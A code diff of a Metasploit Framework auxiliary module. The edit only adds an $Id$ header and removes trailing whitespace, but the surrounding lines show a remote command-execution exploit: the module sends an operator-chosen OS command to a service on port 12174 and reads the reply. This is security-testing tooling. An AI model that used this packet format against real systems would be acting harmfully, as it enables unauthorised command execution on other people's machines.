@@ -1,4 +1,8 @@
 ##
+# $Id$
+##
+
+##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -33,7 +37,7 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'DisclosureDate' => 'Apr 28 2009'))
 
-			register_options( 
+			register_options(
 				[
 					Opt::RPORT(12174),
 					OptString.new('CMD', [ false, 'The OS command to execute', 'cmd /c echo metasploit > %SYSTEMDRIVE%\metasploit.txt']),
@@ -44,19 +48,19 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			connect
 
-				len  = 2 + datastore['CMD'].length		
-				
+				len  = 2 + datastore['CMD'].length
+
 				data =  [0x00000000].pack('V')
 				data << len.chr
 				data << "\x00"
 				data << datastore['CMD'] + " "
 				data << "\x00"
-		
-				print_status("Sending command: #{datastore['CMD']}")	
+
+				print_status("Sending command: #{datastore['CMD']}")
 				sock.put(data)
 
 				res = sock.get_once
-				
+
 					if (!res)
 						print_error("Did not recieve data. Failed?")
 					else
